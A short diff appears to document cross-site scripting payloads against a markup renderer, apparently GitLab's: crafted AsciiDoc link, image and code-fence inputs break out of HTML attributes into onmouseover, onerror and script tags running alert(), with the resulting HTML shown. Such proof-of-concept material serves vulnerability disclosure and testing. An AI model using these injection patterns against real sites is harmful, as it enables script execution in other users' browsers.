@@ -1,0 +1,6 @@
+link:bla"onmouseover="alert(1)[KLIK HIER]
+  Results in: <a onmouseover="alert(1)" href="bla">KLIK HIER</a>
+image:https://gitlab-a.ing.net/fake.png[Alt text" onerror="alert(7)]
+  Results in: <img onerror="alert(7)" alt="Alt text" src="https://gitlab-a.ing.net/fake.png">
+```blaat"><script>alert(3)</script>
+  Results in: <pre lang="blaat"><script>alert(3)</script>"&gt;<code></code></pre>
